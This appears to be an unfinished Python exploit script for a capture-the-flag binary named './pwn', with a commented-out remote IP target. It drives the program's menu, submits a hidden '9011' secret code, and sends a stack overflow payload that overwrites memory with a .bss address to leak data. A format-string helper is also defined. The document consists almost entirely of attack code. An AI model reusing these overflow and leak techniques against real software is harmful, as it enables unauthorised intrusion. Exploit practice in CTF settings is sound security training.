#!/usr/bin/env python
# -*- coding: UTF-8 -*-
# Auth0r : afang
# nice day mua! :P
# desc:

#lambs:
wait = lambda x: raw_input(x)

# imports

from binaryfang import *
import time
import os
import sys
import random

elf = ""
libc = ""
env = ""
LOCAL = 1
context.log_level = "debug"

p = process("./pwn")
#p = remote("106.75.64.61", 16356)

p.recvuntil("option:")

secret_bss = 0x602068

def make_board(buf, sure, go_on=False):

    p.sendline("2")
    p.recvuntil("bored...\n")
    p.send(buf)
    time.sleep(0.2)
    p.recvuntil("y/n\n")

    if go_on:
        p.send(sure)
        p.recvuntil("bored...\n")
    else:
        p.send(sure)
        p.recvuntil("option:")

def stack(content):

    p.sendline("1")
    p.recvuntil("once..\n")
    p.send(content)
    time.sleep(0.2)
    return p.recv()

def fmtstr(fmt):

    p.sendline("3")
    p.recvuntil("?)\n")
    p.send(fmt)
    time.sleep(0.2)
    p.recvuntil("option:")

def secret(secret):

    p.sendline("9011")
    p.recvuntil("code:")
    p.send(secret)
    time.sleep(0.2)
    p.recvuntil("option:")

secret("\x00" * 8)
wait("me")
data = stack("a" * (0x240-8) + p64(secret_bss))
print data
